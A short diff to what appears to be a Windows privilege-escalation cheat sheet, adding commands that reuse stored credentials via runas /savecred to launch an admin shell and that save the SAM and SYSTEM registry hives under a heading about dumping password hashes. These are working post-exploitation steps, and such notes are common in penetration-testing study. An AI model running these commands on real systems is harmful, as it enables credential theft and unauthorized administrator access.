@@ -192,10 +192,17 @@ cmdkey /list
 ```
 
 Use them:
-
+```bash
+runas /savecred /user:admin cmd.exe
+```
 
 ---
 
 ## ## 🔹 Dumping Password Hashes (SAM + SYSTEM)
+```bash
+reg save HKLM\SAM sam
+reg save HKLM\SYSTEM system
+```
 
-`reg save HKLM\SAM sam reg save HKLM\SYSTEM system`
+---
+---
